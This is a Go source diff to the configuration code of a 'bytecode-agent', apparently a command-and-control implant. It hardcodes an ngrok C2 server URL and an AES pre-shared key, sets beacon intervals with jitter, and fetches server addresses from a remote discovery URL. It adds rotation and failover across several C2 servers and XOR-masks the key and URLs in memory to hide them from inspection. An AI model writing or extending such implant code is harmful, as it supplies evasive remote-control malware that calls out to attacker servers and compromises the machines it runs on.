@@ -11,50 +11,49 @@ import (
 	"bytecode-agent/internal/windows"
 )
 
-// DefaultServerURL can be overridden at build time using:
-// -ldflags="-X 'bytecode-agent/internal/config.DefaultServerURL=http://your-ip:3001'"
+// DefaultServerURL can be overridden at build time
 var DefaultServerURL = "https://thu-nonspurious-deloris.ngrok-free.dev"
 
-
-// DebugMode can be set to "true" at build time to show the console and enable verbose logging
+// DebugMode can be set to "true" at build time
 var DebugMode = "false"
 
 // Config holds the agent configuration
 type Config struct {
-	ServerURL     string
-	DiscoveryURL  string // Optional URL to fetch the actual ServerURL from
-	BeaconMin     int    // Minimum beacon interval in seconds
-	BeaconMax     int    // Maximum beacon interval in seconds (jitter)
+	ServerURLs    []string // List of C2 servers for rotation/failover
+	CurrentURLIdx int      // Current server index
+	DiscoveryURL  string
+	BeaconMin     int
+	BeaconMax     int
 	IdentityFile  string
 	IsDebug       bool
 	EncryptionKey []byte
-	Jitter        int // Jitter percentage (0-100)
+	Jitter        int
 	WorkHours     WorkHours
 }
 
 type WorkHours struct {
 	Enabled bool
-	Start   int // 0-23
-	End     int // 0-23
+	Start   int
+	End     int
 }
 
-// DefaultBeaconMin can be overridden at build time
 var DefaultBeaconMin = "30"
-
-// DefaultBeaconMax can be overridden at build time
 var DefaultBeaconMax = "60"
-
-// DefaultEncryptionKey is the PSK for AES traffic encryption (must be 32 bytes)
 var DefaultEncryptionKey = "bytecode-c2-project-secret-key!!"
 
-
-// Load returns the agent configuration from environment or defaults
+// Load returns the agent configuration
 func Load() *Config {
 	discoveryURL := os.Getenv("BYTECODE_DISCOVERY")
-	serverURL := os.Getenv("BYTECODE_SERVER")
+	serverEnv := os.Getenv("BYTECODE_SERVER")
 
-	if serverURL == "" {
-		serverURL = DefaultServerURL
+	if serverEnv == "" {
+		serverEnv = DefaultServerURL
+	}
+
+	// Support comma-separated list of servers
+	urls := strings.Split(serverEnv, ",")
+	for i := range urls {
+		urls[i] = strings.TrimSpace(urls[i])
 	}
 
 	identityFile := os.Getenv("BYTECODE_IDENTITY")
@@ -62,37 +61,74 @@ func Load() *Config {
 		identityFile = ".bytecode_id"
 	}
 
-	// Simple conversion from string to int for build-time flags
 	var min, max int
 	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
 	fmt.Sscanf(DefaultBeaconMax, "%d", &max)
 
 	cfg := &Config{
-		ServerURL:     serverURL,
+		ServerURLs:    urls,
+		CurrentURLIdx: 0,
 		DiscoveryURL:  discoveryURL,
 		BeaconMin:     min,
 		BeaconMax:     max,
 		IdentityFile:  identityFile,
 		IsDebug:       DebugMode == "true",
 		EncryptionKey: []byte(DefaultEncryptionKey),
-		Jitter:        25, // Default 25% jitter
+		Jitter:        25,
 		WorkHours: WorkHours{
 			Enabled: false,
 		},
 	}
 
-	// If discovery URL is provided, try to update ServerURL
 	if cfg.DiscoveryURL != "" {
 		discovered, err := FetchDiscoveryURL(cfg.DiscoveryURL)
 		if err == nil && discovered != "" {
-			cfg.ServerURL = discovered
+			cfg.ServerURLs = append([]string{discovered}, cfg.ServerURLs...)
 		}
 	}
 
 	return cfg
 }
 
-// FetchDiscoveryURL retrieves the server URL from a stable remote source
+// GetServerURL returns the currently active server URL
+func (c *Config) GetServerURL() string {
+	if len(c.ServerURLs) == 0 {
+		return ""
+	}
+	return c.ServerURLs[c.CurrentURLIdx]
+}
+
+// RotateServer moves to the next available C2 server
+func (c *Config) RotateServer() {
+	if len(c.ServerURLs) > 1 {
+		c.CurrentURLIdx = (c.CurrentURLIdx + 1) % len(c.ServerURLs)
+	}
+}
+
+// Mask protects sensitive config in memory
+func (c *Config) Mask() {
+	key := byte(0x42)
+	windows.MaskMemory(c.EncryptionKey, key)
+	
+	for i := range c.ServerURLs {
+		b := []byte(c.ServerURLs[i])
+		windows.MaskMemory(b, key)
+		c.ServerURLs[i] = string(b)
+	}
+}
+
+// Unmask restores config for use
+func (c *Config) Unmask() {
+	key := byte(0x42)
+	windows.MaskMemory(c.EncryptionKey, key)
+	
+	for i := range c.ServerURLs {
+		b := []byte(c.ServerURLs[i])
+		windows.MaskMemory(b, key)
+		c.ServerURLs[i] = string(b)
+	}
+}
+
 func FetchDiscoveryURL(url string) (string, error) {
 	client := &http.Client{Timeout: 10 * time.Second}
 	resp, err := client.Get(url)
@@ -116,30 +152,4 @@ func FetchDiscoveryURL(url string) (string, error) {
 	}
 
 	return discovered, nil
-}
-
-// Mask encrypts sensitive fields in the configuration
-func (c *Config) Mask() {
-	// XOR key for masking (can be randomized in later phases)
-	key := byte(0x42)
-	
-	// Mask Encryption Key
-	windows.MaskMemory(c.EncryptionKey, key)
-	
-	// Mask URLs (requires converting to byte slices)
-	urlBytes := []byte(c.ServerURL)
-	windows.MaskMemory(urlBytes, key)
-	c.ServerURL = string(urlBytes)
-}
-
-// Unmask restores sensitive fields in the configuration
-func (c *Config) Unmask() {
-	key := byte(0x42)
-	
-	// Unmasking is the same as masking (XOR)
-	windows.MaskMemory(c.EncryptionKey, key)
-	
-	urlBytes := []byte(c.ServerURL)
-	windows.MaskMemory(urlBytes, key)
-	c.ServerURL = string(urlBytes)
 }
